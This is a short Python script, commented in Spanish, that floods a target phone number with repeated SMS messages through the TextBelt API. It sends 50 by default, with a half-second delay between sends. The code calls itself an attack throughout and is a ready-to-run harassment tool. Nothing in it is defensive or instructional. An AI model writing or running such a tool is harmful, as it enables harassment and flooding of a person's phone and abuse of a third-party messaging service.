#!/usr/bin/env python3
import os
import argparse
import signal
import requests
import time

# Manejo de la señal de terminación del ataque
def signal_handler(signal, frame):
    print('\n[!] Attack terminated.')
    os._exit(0)

# Enviar SMS a través de TextBelt (puedes sustituirlo por otro servicio)
def send_sms(target, message, count):
    url = "https://textbelt.com/text"
    for i in range(count):
        try:
            response = requests.post(url, {
                'phone': target,
                'message': message,
                'key': 'textbelt',
            })
            if response.json().get('success'):
                print(f"SMS {i+1} enviado con éxito")
            else:
                print(f"Error al enviar SMS {i+1}: {response.json().get('error')}")
        except Exception as e:
            print(f"Error en el envío: {e}")
        time.sleep(0.5)  # Controla el tiempo entre mensajes

# Función principal
def main():
    signal.signal(signal.SIGINT, signal_handler)

    parser = argparse.ArgumentParser()
    parser.add_argument("--target", type=str, metavar="<phone>", help="Target phone number in format +123456789")
    parser.add_argument("--message", type=str, metavar="<message>", help="Message for the attack.")
    parser.add_argument("--count", type=int, default=50, metavar="<count>", help="Number of SMS to send.")

    args = parser.parse_args()

    # Envío de los SMS
    send_sms(args.target, args.message, args.count)

if __name__ == '__main__':
    main()
